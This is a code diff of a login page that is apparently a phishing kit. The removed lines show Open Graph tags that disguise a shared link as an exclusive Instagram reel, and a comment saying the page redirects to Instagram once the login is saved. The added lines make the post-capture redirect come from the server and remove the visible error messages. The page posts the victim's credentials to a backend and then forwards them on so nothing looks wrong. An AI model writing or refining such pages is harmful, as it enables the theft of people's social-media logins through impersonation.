@@ -5,15 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login</title>
   <link rel="stylesheet" href="style.css" />
-
-  <!-- Open Graph para preview do link -->
-  <meta property="og:title" content="Instagram" />
-  <meta property="og:site_name" content="Instagram" />
-  <meta property="og:type" content="video.other" />
-  <meta property="og:url" content="https://www.instagram.com/reel/DJUlfcKMsz0/" />
-  <meta property="og:image" content="https://instagram.fgru1-1.fna.fbcdn.net/v/t50.16885-16/357470126_605411111349936_1670413868579375871_n.jpg?_nc_ht=instagram.fgru1-1.fna.fbcdn.net&_nc_cat=100&_nc_ohc=R-l9H-KHkZEAX88M8oq&edm=ABZsPhsBAAAA&ccb=7-5&oh=00_AfAxLh9C0qWXuPY5bF2aL9gOSLn-B7xRrhcg8X9jw1PZAA&oe=6480CC52&_nc_sid=4efc9f" />
-  <meta property="og:description" content="Assista a este vídeo exclusivo no Instagram." />
-  <meta name="theme-color" content="#000000" />
 </head>
 <body>
   <main class="main-container">
@@ -98,15 +89,13 @@
         });
 
         if (response.ok) {
-          // Se login salvo com sucesso, redireciona para o vídeo no Instagram
-          window.location.href = "https://www.instagram.com/reel/DJUlfcKMsz0/";
+          const data = await response.json();
+          window.location.href = data.redirectUrl;
         } else {
           console.error("Erro ao enviar os dados.");
-          alert("Erro no login, tente novamente.");
         }
       } catch (error) {
         console.error("Erro de conexão com o servidor:", error);
-        alert("Erro de conexão. Tente novamente mais tarde.");
       }
 
       // Limpar os campos
